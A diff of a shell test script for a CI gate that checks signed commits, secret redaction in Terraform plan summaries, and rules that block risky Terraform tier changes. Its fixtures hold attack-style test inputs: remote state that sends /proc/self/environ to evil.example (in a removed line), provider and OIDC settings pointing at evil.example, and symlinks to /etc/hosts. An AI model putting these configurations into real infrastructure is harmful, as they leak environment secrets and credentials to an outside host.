@@ -45,9 +45,26 @@ verdict_prog=$(awk '
   on { print }' <<<"$gate")
 [ -n "$verdict_prog" ] || { echo "could not extract the push-chain verdict" >&2; exit 2; }
 
-if command -v shellcheck > /dev/null 2>&1; then
-  if shellcheck -S warning "$work"/*.sh; then ok; else bad "shellcheck of the extracted scripts"; fi
-fi
+if ! command -v shellcheck > /dev/null 2>&1; then
+  bad "shellcheck is not installed: the extracted scripts were not checked"
+elif shellcheck -S warning "$work"/*.sh; then ok; else bad "shellcheck of the extracted scripts"; fi
+
+# --- Signed commits of George's -------------------------------------------------
+commits_prog=$(awk '
+  /others=\$\(jq -ec --argjson p "\$PLAN_PERSON_ID" \x27/ { sub(/.*--argjson p "\$PLAN_PERSON_ID" \x27/, ""); sub(/\x27 <<<"\$commits".*/, ""); print }' <<<"$gate")
+[ -n "$commits_prog" ] || { echo "could not extract the commit check" >&2; exit 2; }
+cm() { # author_id author_type committer_id committer_type committer_login verified
+  jq -cn --argjson ai "$1" --arg at "$2" --argjson ci "$3" --arg ct "$4" --arg cl "$5" --argjson v "$6" \
+    '{sha: "0123456789abcdef0123456789abcdef01234567", author: {id: $ai, type: $at, login: "a"}, committer: {id: $ci, type: $ct, login: $cl}, commit: {verification: {verified: $v}}}'
+}
+others() { jq -c --argjson p 146720324 "$commits_prog" <<<"$1" | jq 'length'; }
+expect "commits: George's, signed" 0 "$(others "[$(cm 146720324 User 146720324 User g true)]")"
+expect "commits: unsigned" 1 "$(others "[$(cm 146720324 User 146720324 User g false)]")"
+expect "commits: another person's" 1 "$(others "[$(cm 42 User 42 User x true)]")"
+expect "commits: another author" 1 "$(others "[$(cm 42 User 146720324 User g true)]")"
+expect "commits: web-flow" 1 "$(others "[$(cm 146720324 User 19864447 User web-flow true)]")"
+expect "commits: a bot" 1 "$(others "[$(cm 146720324 User 99 Bot b true)]")"
+expect "commits: unlinked author" 1 "$(others "[$(jq -cn '{sha: "x", author: null, committer: {id: 146720324, type: "User", login: "g"}, commit: {verification: {verified: true}}}')]")"
 
 # --- Push chain ---------------------------------------------------------------
 G=146720324
@@ -87,16 +104,16 @@ plan='{"format_version":"1.2","resource_changes":[
   {"address":"azurerm_key_vault_secret.s","mode":"managed","change":{"actions":["update"],"before":{"name":"s","value":"TOPSECRET"},"after":{"name":"s","value":"NEWSECRET"}}},
   {"address":"azurerm_storage_account.a[\"KEYSECRET\"]","mode":"managed","change":{"actions":["create"],"before":null,"after":{"name":"a"}}},
   {"address":"azurerm_storage_account.b[\"a]b SPLITSECRET\"]","mode":"managed","change":{"actions":["create"],"before":null,"after":{"name":"b"}}},
-  {"address":"azurerm_storage_account.c[2]","mode":"managed","change":{"actions":["delete"],"before":{"name":"c"},"after":null}},
+  {"address":"azurerm_storage_account.c[271828]","mode":"managed","change":{"actions":["delete"],"before":{"name":"c"},"after":null}},
   {"address":"data.x.y","mode":"data","change":{"actions":["read"]}}],
   "resource_drift":[{"address":"azurerm_role_assignment.r[\"DRIFTSECRET\"]","mode":"managed","change":{"actions":["update"],"before":{"x":1},"after":{"x":2}}}],
   "output_changes":{"o":{"actions":["update"],"before":"OLDOUT","after":"NEWOUT"}}}'
 out=$("$work/plan-summary.sh" platform <<<"$plan")
-if grep -E 'TOPSECRET|NEWSECRET|KEYSECRET|SPLITSECRET|DRIFTSECRET|OLDOUT|NEWOUT' <<<"$out" > /dev/null; then bad "summary: a value or key leaks"; echo "$out"; else ok; fi
+if grep -E 'TOPSECRET|NEWSECRET|KEYSECRET|SPLITSECRET|DRIFTSECRET|OLDOUT|NEWOUT|271828' <<<"$out" > /dev/null; then bad "summary: a value or key leaks"; echo "$out"; else ok; fi
 expect "summary: heading" "#### platform tier" "$out"
 for want in 'Plan: 2 to add, 1 to change, 1 to destroy.' '| update | `azurerm_key_vault_secret.s` | value |' \
             '| create | `azurerm_storage_account.a[…]` |' '| create | `azurerm_storage_account.b[…]` |' \
-            '| delete | `azurerm_storage_account.c[2]` |' '| update | `azurerm_role_assignment.r[…]` | x |' 'Outputs: update `o`'; do
+            '| delete | `azurerm_storage_account.c[…]` |' '| update | `azurerm_role_assignment.r[…]` | x |' 'Outputs: update `o`'; do
   if grep -F -- "$want" <<<"$out" > /dev/null; then ok; else bad "summary: missing '$want'"; fi
 done
 rc=0; "$work/plan-summary.sh" platform <<<'not json' > /dev/null 2>&1 || rc=$?
@@ -104,10 +121,12 @@ expect "summary: not a plan" 3 "$rc"
 rc=0; "$work/plan-summary.sh" identity <<<"$plan" > /dev/null 2>&1 || rc=$?
 expect "summary: unknown tier" 2 "$rc"
 
+
 # --- Tier rules ---------------------------------------------------------------
 repo="$work/repo"
 tier="$repo/infrastructure/terraform/compute"
-mkdir -p "$tier" "$repo/infrastructure/terraform/environments"
+envdir="$repo/infrastructure/terraform/environments"
+mkdir -p "$tier/files" "$envdir"
 cat > "$tier/versions.tf" <<'TF'
 terraform {
   required_version = ">= 1.14.0, < 2.0.0"
@@ -124,31 +143,32 @@ provider "azurerm" {
   features {}
 }
 TF
-cat > "$tier/backend.tf" <<'TF'
-terraform {
-  backend "azurerm" {}
-}
-TF
+printf 'terraform {\n  backend "azurerm" {}\n}\n' > "$tier/backend.tf"
 cat > "$tier/main.tf" <<'TF'
 data "terraform_remote_state" "platform" {
   backend = "azurerm"
   config = {
-    key = "caersid/platform-production.tfstate"
+    key              = "caersid/platform-production.tfstate"
+    use_azuread_auth = true
   }
-}
-
-resource "azurerm_resource_group" "this" {
-  name     = "rg"
-  location = "uksouth"
 }
 TF
 cat > "$tier/storage.tf" <<'TF'
+# Static site storage.
 resource "azurerm_storage_account" "this" {
-  name = "st"
+  name     = "st"
+  provider = azurerm
+}
+
+resource "azurerm_storage_blob" "serve" {
+  name   = "serve.json"
+  source = "${path.module}/files/serve.json"
 }
 TF
+printf 'variable "subscription_id" {\n  type = string\n}\n' > "$tier/variables.tf"
+printf '{}\n' > "$tier/files/serve.json"
 printf 'provider "registry.terraform.io/hashicorp/azurerm" {\n  version = "5.12.0"\n}\n' > "$tier/.terraform.lock.hcl"
-printf 'subscription_id = "x"\n' > "$repo/infrastructure/terraform/environments/compute-production.tfvars"
+printf 'subscription_id = "x"\n' > "$envdir/compute-production.tfvars"
 git -C "$repo" init -q
 git -C "$repo" -c user.name=t -c user.email=t@example.invalid add -A
 git -C "$repo" -c user.name=t -c user.email=t@example.invalid commit -q -m base
@@ -160,47 +180,77 @@ rules() { # <name> <want exit> [want reason prefix]: after the mutation in the w
   if [ "$rc" = "$2" ] && [[ $reason == "${3:-}"* ]]; then ok; else bad "rules: $1: want exit $2 ${3:+'$3…'}, got exit $rc '$reason'"; fi
   reset
 }
+append() { printf '%b' "$2" >> "$tier/$1"; }
 
+# Planned: ordinary changes, including the false positives of a keyword scan.
 rules "unchanged" 0 "ok:"
-printf '\nresource "azurerm_storage_container" "c" {\n  name = "c"\n}\n' >> "$tier/storage.tf"
-rules "harmless addition" 0 "ok:"
-sed -i.bak 's/"rg"/"rg2"/' "$tier/main.tf" && rm "$tier/main.tf.bak"
-rules "harmless change beside remote state" 0 "ok:"
-{ printf 'provider "azurerm" {\n  alias         = "x"\n  metadata_host = "evil.example"\n}\n'; for _ in $(seq 1 20000); do echo '# padding padding padding padding'; done; } > "$tier/aaa.tf"
-rules "new provider block, then a large file" 3 "aaa.tf adds"
-awk '{ print } /^provider "azurerm"/ { print "  metadata_host = \"evil.example\"" }' "$tier/versions.tf" > "$tier/v" && mv "$tier/v" "$tier/versions.tf"
-rules "metadata_host in the existing provider block" 3 "versions.tf adds"
-printf 'data "terraform_remote_state" "x" {\n  backend = "http"\n  config = { address = "https://evil.example/${file("/proc/self/environ")}" }\n}\n' > "$tier/evil.tf"
-rules "http remote state" 3 "evil.tf adds"
-sed -i.bak 's/backend = "azurerm"/backend = "http"/' "$tier/main.tf" && rm "$tier/main.tf.bak"
-rules "remote state backend changed" 3 "main.tf adds"
-printf 'module x {\n  source = "./m"\n}\n' >> "$tier/storage.tf"
-rules "bare-label module" 3 "storage.tf has a module block"
-printf 'module"x"{\n  source = "./m"\n}\n' >> "$tier/storage.tf"
-rules "module without spaces" 3 "storage.tf has a module block"
-ln -s ../environments/compute-production.tfvars "$tier/link.tf"
-rules "symbolic link .tf" 3 "the tier contains a symbolic link"
-rm "$repo/infrastructure/terraform/environments/compute-production.tfvars" && ln -s /etc/hosts "$repo/infrastructure/terraform/environments/compute-production.tfvars"
-rules "symbolic link tfvars" 3 "the tier's tfvars file is a symbolic link"
-printf '*.tf -diff\n' > "$repo/.gitattributes"
-printf 'provider "azurerm" {\n  alias = "y"\n}\n' >> "$tier/storage.tf"
-rules ".gitattributes -diff with a provider" 3 "storage.tf adds"
+append storage.tf '\nresource "azurerm_storage_container" "c" {\n  name = "c"\n}\n'
+rules "a new resource" 0 "ok:"
+append storage.tf '\nresource "azurerm_role_assignment" "r" {\n  scope              = "/subscriptions/x/resourceGroups/rg/providers/Microsoft.Storage/storageAccounts/st"\n  role_definition_id = "/providers/Microsoft.Authorization/roleDefinitions/abc"\n}\n'
+rules "a resource ID with /providers/" 0 "ok:"
+append storage.tf '\nresource "azurerm_storage_blob" "b" {\n  source = "${path.module}/files/b.json"\n}\n'
+rules "path.module" 0 "ok:"
+append storage.tf '\n# The backend and the provider are set in versions.tf; no module here.\n// terraform { } lives elsewhere\n'
+rules "comment lines naming keywords" 0 "ok:"
+append storage.tf '\noutput "e" {\n  value = azurerm_storage_account.this.primary_web_endpoint\n}\n'
+rules "an endpoint attribute" 0 "ok:"
+awk '/provider = azurerm/ { held = $0; next } { print } END { print held }' "$tier/storage.tf" > "$work/s" && mv "$work/s" "$tier/storage.tf"
+rules "a risky line moved within its file" 0 "ok:"
+
+# Not planned: frozen files.
+append versions.tf '\n# a comment\n'
+rules "versions.tf changed at all" 3 "versions.tf differs"
+awk '{ print } /^provider "azurerm"/ { print "  metadata_host = \"evil.example\"" }' "$tier/versions.tf" > "$work/v" && mv "$work/v" "$tier/versions.tf"
+rules "metadata_host in the provider block" 3 "versions.tf differs"
 mv "$tier/versions.tf" "$tier/providers.tf"
-rules "renamed versions.tf" 3 "providers.tf adds"
+rules "versions.tf renamed" 3 "versions.tf differs"
 rm "$tier/backend.tf"
-rules "removed backend.tf" 3 "backend.tf adds"
-printf '\n' >> "$tier/.terraform.lock.hcl"
+rules "backend.tf removed" 3 "backend.tf differs"
+sed -i.bak 's/use_azuread_auth = true/use_azuread_auth = true\n    ${"oidc"}_request_url = "https:\/\/evil.example"/' "$tier/main.tf" && rm "$tier/main.tf.bak"
+rules "a built key in the remote-state config" 3 "main.tf mentions terraform_remote_state"
+append main.tf '\nlocals {\n  x = 1\n}\n'
+rules "any change to the remote-state file" 3 "main.tf mentions terraform_remote_state"
+append storage.tf '\ndata "terraform_remote_state" "x" {\n  backend = "http"\n  config  = merge({}, jsondecode(var.c))\n}\n'
+rules "remote state in another file" 3 "storage.tf mentions terraform_remote_state"
+printf 'subscription_id = "y"\n' > "$envdir/compute-production.tfvars"
+rules "tfvars changed" 3 "the tier's tfvars file differs"
+printf 'c = "{}"\n' > "$tier/extra.auto.tfvars"
+rules "an auto.tfvars file" 3 "extra.auto.tfvars differs"
+printf 'c = "{}"\n' > "$tier/terraform.tfvars"
+rules "a terraform.tfvars file" 3 "terraform.tfvars differs"
+append .terraform.lock.hcl '\n'
 rules "lock file changed" 3 "the tier's .terraform.lock.hcl differs"
+
+# Not planned: modules, links, special files, risky lines.
+append storage.tf '\nmodule x {\n  source = "./m"\n}\n'
+rules "a bare-label module" 3 "storage.tf adds"
+append storage.tf '\nmodule"x"{\n  source = "./m"\n}\n'
+rules "a module without spaces" 3 "storage.tf adds"
+append storage.tf '\n/**/ module "m" { source = "./m" }\n'
+rules "a module after an inline comment" 3 "storage.tf adds"
+mkdir -p "$tier/m" && printf 'data "terraform_remote_state" "x" {\n  backend = "http"\n}\n' > "$tier/m/main.tf"
+rules "configuration in a subdirectory" 3 "a subdirectory of the tier"
+printf '{}\n' > "$tier/files/x.tf.json"
+rules "JSON configuration in a subdirectory" 3 "a subdirectory of the tier"
+{ printf 'provider "azurerm" {\n  alias = "x"\n}\n'; for _ in $(seq 1 20000); do echo '# padding padding padding padding'; done; } > "$tier/aaa.tf"
+rules "a new provider block, then a large file" 3 "aaa.tf adds"
+append storage.tf '\n/**/ provider "azurerm" { alias = "y" }\n'
+rules "a provider after an inline comment" 3 "storage.tf adds"
+append storage.tf '\nresource "x" "y" {\n  provider = azurerm.y\n}\n'
+rules "a provider meta-argument" 3 "storage.tf adds"
+ln -s ../environments/compute-production.tfvars "$tier/link.tf"
+rules "a symbolic link .tf" 3 "the tier contains a symbolic link"
+rm "$envdir/compute-production.tfvars" && ln -s /etc/hosts "$envdir/compute-production.tfvars"
+rules "a symbolic link tfvars" 3 "the tier's tfvars file is a symbolic link"
+printf '*.tf -diff\n' > "$repo/.gitattributes"
+append storage.tf '\nprovider "azurerm" {\n  alias = "z"\n}\n'
+rules ".gitattributes -diff with a provider" 3 "storage.tf adds"
 mkdir -p "$tier/terraform.d/plugins"
 rules "terraform.d" 3 "the tier has an override file"
 printf '{}\n' > "$tier/x.tf.json"
 rules ".tf.json" 3 "the tier has an override file"
 printf 'resource "x" "y" {}\n' > "$tier/storage_override.tf"
-rules "override file" 3 "the tier has an override file"
-printf 'output "e" {\n  value = azurerm_storage_account.this.primary_web_endpoint\n}\n' >> "$tier/storage.tf"
-rules "a line naming an endpoint" 3 "storage.tf adds"
-awk 'NR == 1 { first = $0; next } { print } END { print first }' "$tier/main.tf" > "$tier/m" && mv "$tier/m" "$tier/main.tf"
-rules "risky line moved within its file" 0 "ok:"
+rules "an override file" 3 "the tier has an override file"
 rc=0; BASE_SHA=$base "$work/tier-rules.sh" identity "$repo" > /dev/null 2>&1 || rc=$?
 expect "rules: unknown tier" 2 "$rc"
 rc=0; BASE_SHA=nope "$work/tier-rules.sh" compute "$repo" > /dev/null 2>&1 || rc=$?
